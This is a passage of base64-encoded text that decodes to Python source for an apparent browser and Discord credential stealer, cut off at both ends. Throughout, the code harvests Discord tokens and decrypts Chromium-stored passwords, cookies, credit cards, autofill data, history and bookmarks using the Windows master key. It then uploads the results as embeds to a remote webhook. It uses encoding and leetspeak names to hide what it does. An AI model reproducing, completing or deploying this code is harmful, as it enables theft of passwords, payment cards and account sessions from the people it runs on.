TExMTM2NDAyNDQwODQ5NDE0MC8xMTExMzY0MTgxMDMyMTc3NzY2L2NzLnBuZyIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6IGYie2NuYW1lfSB8IHQubWUve3NtYWxsY25hbWV9ciIsCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvMTExMTM2NDAyNDQwODQ5NDE0MC8xMTExMzY0MTgxMDMyMTc3NzY2L2NzLnBuZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMMDREVXIxMTgoaDAwaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgogICAgCiAgICBpZiBuYW1lID09ICJraXdpIjoKICAgICAgICBzdHJpbmcgPSBsaW5rLnNwbGl0KCJcblxuIikKICAgICAgICBlbmRsaXN0ID0gW10KICAgICAgICBmb3IgaSBpbiBzdHJpbmc6CiAgICAgICAgICAgIGkgPSBpLnNwbGl0KCJcbiIpCiAgICAgICAgICAgIGkgPSBsaXN0KGZpbHRlcihOb25lLCBpKSkKICAgICAgICAgICAgdmFsID0gIiIKICAgICAgICAgICAgZm9yIHggaW4gaToKICAgICAgICAgICAgICAgIGlmIHguc3RhcnRzd2l0aCgi4pSU4pSAIik6CiAgICAgICAgICAgICAgICAgICAgdmFsICs9IHggKyAiXG4iCiAgICAgICAgICAgIGlmIGxlbihpKSA+IDE6CiAgICAgICAgICAgICAgICBlbmRsaXN0LmFwcGVuZCh7Im5hbWUiOiBpWzBdLCAidmFsdWUiOiB2YWwsICJpbmxpbmUiOiBGYWxzZX0pCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiBHTElORk8sCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAiY29sb3IiOiAyODk1NjY3LAogICAgICAgICAgICAgICAgImZpZWxkcyI6IGVuZGxpc3QsCiAgICAgICAgICAgICAgICAidGl0bGUiOiBmIntjbmFtZX0gfCBGaWxlIHt3b3Jkc30iLAogICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAidGV4dCI6IGYie2Zvb3RlcmN9IiwKICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMTExMzY0MDI0NDA4NDk0MTQwLzExMTEzNjQxODEwMzIxNzc3NjYvY3MucG5nIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAidXNlcm5hbWUiOiBmIntjbmFtZX0gfCB0Lm1lL3tzbWFsbGNuYW1lfXIiLAogICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzExMTEzNjQwMjQ0MDg0OTQxNDAvMTExMTM2NDE4MTAzMjE3Nzc2Ni9jcy5wbmciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTDA0RFVyMTE4KGgwMGssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4KCmRlZiBXcjE3M0YwckYxMTMoZGF0YSwgbmFtZSk6CiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlxjc3tuYW1lfS50eHQiCiAgICB3aXRoIG9wZW4ocGF0aCwgbW9kZT0ndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgZm9yIGxpbmUgaW4gZGF0YToKICAgICAgICAgICAgaWYgbGluZVswXSAhPSAnJzoKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7bGluZX1cbiIpCgpkZWYgRzM3NzBLM04ocGF0aCwgYXJnKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aCArPSBhcmcKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aCk6CiAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgiLmxvZyIpIG9yIGZpbGUuZW5kc3dpdGgoIi5sZGIiKSAgIDoKICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfSIsIHIibWZhXC5bXHctXXs4MCw5NX0iKToKICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUMEszTnMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ0gzQ0s3MEszTih0b2tlbik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW4gaW4gVDBLM05zOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFQwSzNOcyArPSB0b2tlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVQMTA0RDcwSzNOKHRva2VuLCBwYXRoKQoKCmRlZiBTUTE3SDFONihwYXRoQywgdGVtcGZvbGQsIGNtZCk6CiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoY21kKQogICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcGZvbGQpCiAgICByZXR1cm4gZGF0YQoKZGVmIEczN1A0NTVXKHBhdGgsIGFyZyk6CiAgICB0cnk6CiAgICAgICAgZ2xvYmFsIFA0NTV3LCBQNDU1V0MwVU50CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Mb2dpbiBEYXRhIgogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCgogICAgICAgIHRlbXBmb2xkID0gdGVtcCArICJjcyIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgoKICAgICAgICBkYXRhID0gU1ExN0gxTjYocGF0aEMsIHRlbXBmb2xkLCAiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2luczsiKQoKICAgICAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICAgICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBsb2FkcyhmLnJlYWQoKSkKICAgICAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICAgICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICAgICAgZm9yIHJvdyBpbiBkYXRhOgogICAgICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgICAgICBmb3Igd2EgaW4gazNZVzByZDoKICAgICAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgICAgIHRtcCA9IHdhCiAgICAgICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9sZCBpbiBwNDVXVzByRHM6IHA0NVdXMHJEcy5hcHBlbmQob2xkKQogICAgICAgICAgICAgICAgUDQ1NXcuYXBwZW5kKGYiVVIxOiB7cm93WzBdfSB8IFU1M1JONE0zOiB7cm93WzFdfSB8IFA0NTVXMFJEOiB7RDNDcllQN1Y0MVUzKHJvd1syXSwgbWFzdGVyX2tleSl9IikKICAgICAgICAgICAgICAgIFA0NTVXQzBVTnQgKz0gMQogICAgICAgIFdyMTczRjByRjExMyhQNDU1dywgJ3Bhc3N3b3JkcycpCiAgICBleGNlcHQ6cGFzcwoKZGVmIEczN0MwMEsxMyhwYXRoLCBhcmcpOgogICAgdHJ5OgogICAgICAgIGdsb2JhbCBDMDBLMTNzLCBDMDBLMUMwVU50CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIgogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCgogICAgICAgIHRlbXBmb2xkID0gdGVtcCArICJjcyIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgoKICAgICAgICBkYXRhID0gU1ExN0gxTjYocGF0aEMsIHRlbXBmb2xkLCAiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzICIpCgogICAgICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKCiAgICAgICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBsb2FkcyhmLnJlYWQoKSkKICAgICAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICAgICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICAgICAgZm9yIHJvdyBpbiBkYXRhOgogICAgICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgICAgICBmb3Igd2EgaW4gazNZVzByZDoKICAgICAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgICAgIHRtcCA9IHdhCiAgICAgICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9sZCBpbiBjMDBLMVcwckRzOiBjMDBLMVcwckRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgICAgICBDMDBLMTNzLmFwcGVuZChmIntyb3dbMF19CVRSVUUJLwlGQUxTRQkyNTk3NTczNDU2CXtyb3dbMV19CXtEM0NyWVA3VjQxVTMocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgICAgICAgICAgICAgQzAwSzFDMFVOdCArPSAxCiAgICAgICAgV3IxNzNGMHJGMTEzKEMwMEsxM3MsICdjb29raWVzJykKICAgIGV4Y2VwdDpwYXNzCgpkZWYgRzM3Q0M1KHBhdGgsIGFyZyk6CiAgICB0cnk6CiAgICAgICAgZ2xvYmFsIENDcywgQ0M1QzBVTnQKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybgoKICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL1dlYiBEYXRhIgogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCgogICAgICAgIHRlbXBmb2xkID0gdGVtcCArICJjcyIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgoKICAgICAgICBkYXRhID0gU1ExN0gxTjYocGF0aEMsIHRlbXBmb2xkLCAiU0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHMgIikKCiAgICAgICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgogICAgICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0gbG9hZHMoZi5yZWFkKCkpCiAgICAgICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgICAgIGZvciByb3cgaW4gZGF0YToKICAgICAgICAgICAgaWYgcm93WzBdICE9ICcnOgogICAgICAgICAgICAgICAgQ0NzLmFwcGVuZChmIkM0UkQgTjRNMzoge3Jvd1sxXX0gfCBOVU1CM1I6IHtEM0NyWVA3VjQxVTMocm93WzRdLCBtYXN0ZXJfa2V5KX0gfCBFWFAxUlk6IHtyb3dbMl19L3tyb3dbM119IikKICAgICAgICAgICAgICAgIENDNUMwVU50ICs9IDEKICAgICAgICBXcjE3M0YwckYxMTMoQ0NzLCAnY3JlZGl0Y2FyZHMnKQogICAgZXhjZXB0OnBhc3MKCmRlZiBHMzc0VTcwRjExMShwYXRoLCBhcmcpOgogICAgdHJ5OgogICAgICAgIGdsb2JhbCBBVTcwRjExbCwgQVU3MEYxMTFDMFVOdAogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvV2ViIERhdGEiCiAgICAgICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICAgICAgdGVtcGZvbGQgPSB0ZW1wICsgImNzIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCgogICAgICAgIGRhdGEgPSBTUTE3SDFONihwYXRoQywgdGVtcGZvbGQsIlNFTEVDVCAqIEZST00gYXV0b2ZpbGwgV0hFUkUgdmFsdWUgTk9UIE5VTEwiKQoKICAgICAgICBmb3Igcm93IGluIGRhdGE6CiAgICAgICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgICAgIEFVNzBGMTFsLmFwcGVuZChmIk40TTM6IHtyb3dbMF19IHwgVjRMVTM6IHtyb3dbMV19IikKICAgICAgICAgICAgICAgIEFVNzBGMTExQzBVTnQgKz0gMQogICAgICAgIFdyMTczRjByRjExMyhBVTcwRjExbCwgJ2F1dG9maWxsJykKICAgIGV4Y2VwdDpwYXNzCgpkZWYgRzM3SDE1NzByWShwYXRoLCBhcmcpOgogICAgdHJ5OgogICAgICAgIGdsb2JhbCBIMTU3MHJZLCBIMTU3MHJZQzBVTnQKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybgoKICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiSGlzdG9yeSIKICAgICAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybgogICAgICAgIHRlbXBmb2xkID0gdGVtcCArICJjcyIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgogICAgICAgIGRhdGEgPSBTUTE3SDFONihwYXRoQywgdGVtcGZvbGQsIlNFTEVDVCAqIEZST00gdXJscyIpCgogICAgICAgIGZvciByb3cgaW4gZGF0YToKICAgICAgICAgICAgaWYgcm93WzBdICE9ICcnOgogICAgICAgICAgICAgICAgSDE1NzByWS5hcHBlbmQocm93WzFdKQogICAgICAgICAgICAgICAgSDE1NzByWUMwVU50ICs9IDEKICAgICAgICBXcjE3M0YwckYxMTMoSDE1NzByWSwgJ2hpc3RvcnknKQogICAgZXhjZXB0OnBhc3MKCmRlZiBHMzdXMzg1MTczNShXb3Jkcyk6CiAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIFdvcmRzKQogICAgaWYgbGVuKHJiKSA+IDEwMDA6CiAgICAgICAgcnJycnIgPSByM0Ywck00NyhzdHIoV29yZHMpKQogICAgICAgIHJldHVybiAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikKICAgIGVsc2U6IHJldHVybiByYgoKZGVmIEczNzgwMEtNNHJLNShwYXRoLCBhcmcpOgogICAgdHJ5OgogICAgICAgIGdsb2JhbCBCMDBLTTRySzUsIEIwMEtNNHJLNUMwVU50CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIkJvb2ttYXJrcyIKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6CiAgICAgICAgICAgIHdpdGggb3BlbihwYXRoQywgJ3InLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6CiAgICAgICAgICAgICAgICBkYXRhID0gbG9hZHMoZi5yZWFkKCkpCiAgICAgICAgICAgICAgICBmb3IgaSBpbiBkYXRhWydyb290cyddWydib29rbWFya19iYXInXVsnY2hpbGRyZW4nXToKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIEIwMEtNNHJLNS5hcHBlbmQoZiJONE0zOiB7aVsnbmFtZSddfSB8IFVSMToge2lbJ3VybCddfSIpCiAgICAgICAgICAgICAgICAgICAgICAgIEIwMEtNNHJLNUMwVU50ICs9IDEKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6cGFzcwogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCiAgICAgICAgV3IxNzNGMHJGMTEzKEIwMEtNNHJLNSwgJ2Jvb2ttYXJrcycpCiAgICBleGNlcHQ6cGFzcwoKZGVmIHM3NHI3ODdIcjM0RChmdW5jLCBhcmcpOgogICAgZ2xvYmFsIEJyb3dzZXJ0aHJlYWQKICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1mdW5jLCBhcmdzPWFyZykKICAgIHQuc3RhcnQoKQogICAgQnJvd3NlcnRocmVhZC5hcHBlbmQodCkKCmRlZiBHMzc4cjBXNTNyNShicjBXNTNyUDQ3SDUpOgogICAgZ2xvYmFsIEJyb3dzZXJ0aHJlYWQKICAgIFRoQ29raywgQnJvd3NlcnRocmVhZCwgZmlsZXNzID0gW10sIFtdLCBbXQogICAgZm9yIHBhdHQgaW4gYnIwVzUzclA0N0g1OgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1HMzdDMDBLMTMsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNF1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRoQ29ray5hcHBlbmQoYSkKCiAgICAgICAgczc0cjc4N0hyMzREKEczNzRVNzBGMTExLCAgICAgICBbcGF0dFswXSwgcGF0dFszXV0pCiAgICAgICAgczc0cjc4N0hyMzREKEczN0gxNTcwclksICAgICAgICBbcGF0dFswXSwgcGF0dFszXV0pCiAgICAgICAgczc0cjc4N0hyMzREKEczNzgwMEtNNHJLNSwgICAgICBbcGF0dFswXSwgcGF0dFszXV0pCiAgICAgICAgczc0cjc4N0hyMzREKEczN0NDNSwgICAgICAgICAgICBbcGF0dFswXSwgcGF0dFszXV0pCiAgICAgICAgczc0cjc4N0hyMzREKEczN1A0NTVXLCAgICAgICAgICBbcGF0dFswXSwgcGF0dFszXV0pCgogICAgZm9yIHRocmVhZCBpbiBUaENva2s6IHRocmVhZC5qb2luKCkKICAgIGlmIFRyVTU3KEMwMEsxM3MpID09IFRydWU6IF9faW1wb3J0X18oJ3N5cycpLmV4aXQoMCkKICAgIGZvciB0aHJlYWQgaW4gQnJvd3NlcnRocmVhZDogdGhyZWFkLmpvaW4oKQoKICAgIGZvciBmaWxlIGluIFsiY3NwYXNzd29yZHMudHh0IiwgImNzY29va2llcy50eHQiLCAiY3NjcmVkaXRjYXJkcy50eHQiLCAiY3NhdXRvZmlsbHMudHh0IiwgImNzaGlzdG9yaWVzLnR4dCIsICJjc2Jvb2ttYXJrcy50eHQiXToKICAgICAgICBmaWxlc3MuYXBwZW5kKFVQMTA0RDcwNjBGMTEzKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpKQogICAgaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIn0KCiAgICBkYXRhID0gewogICAgICAgICJjb250ZW50IjogR0xJTkZPLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJ0aXRsZSI6IGYie2NuYW1lfSB8IFBhc3N3b3JkIHt3b3Jkc30iLAogICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiIqKkZvdW5kKio6XG57RzM3VzM4NTE3MzUocDQ1V1cwckRzKX1cblxuKipEYXRhOioqXG48OmJsYWNrbG9jazoxMDk1NzQxMDIyMDY1MTMxNTcxPiDigKIgKip7UDQ1NVdDMFVOdH0qKiBQYXNzd29yZHMgRm91bmRcbjw6YmxhY2thcnJvdzoxMDk1NzQwOTc1MTk3OTk1MDQxPiDigKIgW3tjbmFtZX1QYXNzd29yZHMudHh0XSh7ZmlsZXNzWzBdfSkiLAogICAgICAgICAgICAgICAgImNvbG9yIjogMjg5NTY2NywKICAgICAgICAgICAgICAgICJmb290ZXIiOiB7InRleHQiOiBmIntmb290ZXJjfSIsICAKICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzExMTEzNjQwMjQ0MDg0OTQxNDAvMTExMTM2NDE4MTAzMjE3Nzc2Ni9jcy5wbmcifQogICAgICAgICAgICB9LAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAidGl0bGUiOiBmIntjbmFtZX0gfCBDb29raWVzIHt3b3Jkc30iLAogICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiIqKkZvdW5kKio6XG57RzM3VzM4NTE3MzUoYzAwSzFXMHJEcyl9XG5cbioqRGF0YToqKlxuPDpicm93c2VyOjEwOTU3NDI4NjY1MTg3MTY1NjY+IOKAoiAqKntDMDBLMUMwVU50fSoqIENvb2tpZXMgRm91bmRcbjw6YmxhY2thcnJvdzoxMDk1NzQwOTc1MTk3OTk1MDQxPiDigKIgW3tjbmFtZX1Db29raWVzLnR4dF0oe2ZpbGVzc1sxXX0pIiwKICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAiZm9vdGVyIjogeyJ0ZXh0IjogZiJ7Zm9vdGVyY30iLCAgCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMTExMzY0MDI0NDA4NDk0MTQwLzExMTEzNjQxODEwMzIxNzc3NjYvY3MucG5nIn0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgInRpdGxlIjogZiJ7Y25hbWV9IHwgQnJvd3NlciBEYXRhIiwKICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiPDpzcmNyX25ld3NwYXBlcjoxMTg3NTc5Nzk1MDU2MzczNzgyPiDigKIgKip7SDE1NzByWUMwVU50fSoqIEhpc3RvcmllcyBGb3VuZFxuPDpibGFja2Fycm93OjEwOTU3NDA5NzUxOTc5OTUwNDE+IOKAoiBbe2NuYW1lfUhpc3Rvcmllcy50eHRdKHtmaWxlc3NbNF19KVxuXG48OmxvbF9yb2xlX2ZpbGw6MTE4Nzc0NzU5OTI4NjAxODE0OT4g4oCiICoqe0FVNzBGMTExQzBVTnR9KiogQXV0b2ZpbGxzIEZvdW5kXG48OmJsYWNrYXJyb3c6MTA5NTc0MDk3NTE5Nzk5NTA0MT4g4oCiIFt7Y25hbWV9QXV0b2ZpbGxzLnR4dF0oe2ZpbGVzc1szXX0pXG5cbjw6MVNXX0NyZWRpdENhcmQ6MTE4NzU4MDE1OTQ5NTI0NTg3Nj4g4oCiICoqe0NDNUMwVU50fSoqIENyZWRpdCBDYXJkcyBGb3VuZFxuPDpibGFja2Fycm93OjEwOTU3NDA5NzUxOTc5OTUwNDE+IOKAoiBbe2NuYW1lfUNyZWRpdENhcmRzLnR4dF0oe2ZpbGVzc1syXX0pXG5cbjw6YmxhY2tfYm9vazoxMTg3NTc3NTUyNzM5NTA4Mjg2PiDigKIgKip7QjAwS000cks1QzBVTnR9KiogQm9va21hcmtzIEZvdW5kXG48OmJsYWNrYXJyb3c6MTA5NTc0MDk3NTE5Nzk5NTA0MT4g4oCiIFt7Y25hbWV9Qm9va21hcmtzLnR4dF0oe2ZpbGVzc1s1XX0pIiwKICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAiZm9vdGVyIjogeyJ0ZXh0IjogZiJ7Zm9vdGVyY30iLCAgCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMTExMzY0MDI0NDA4NDk0MTQwLzExMTEzNjQxODEwMzIxNzc3NjYvY3MucG5nIn0KICAgICAgICAgICAgfQogICAgICAgIF0sCiAgICAgICAgInVzZXJuYW1lIjogZiJ7Y25hbWV9IHwgdC5tZS97c21hbGxjbmFtZX1yIiwKICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzExMTEzNjQwMjQ0MDg0OTQxNDAvMTExMTM2NDE4MTAzMjE3Nzc2Ni9jcy5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICB9CiAgICBMMDREVXIxMTgoaDAwaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgcmV0dXJuCgpkZWYgRzM3RDE1QzByRChwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGYie3BhdGh9L0xvY2FsIFN0YXRlIik6IHJldHVybgogICAgcGF0aEMgPSBwYXRoICsgYXJnCiAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGxvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGhDfVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHIiZFF3NHc5V2dYY1E6W14uKlxbJyguKiknXF0uKiRdW15cIl0qIiwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUMEszTnMKICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5EZWNv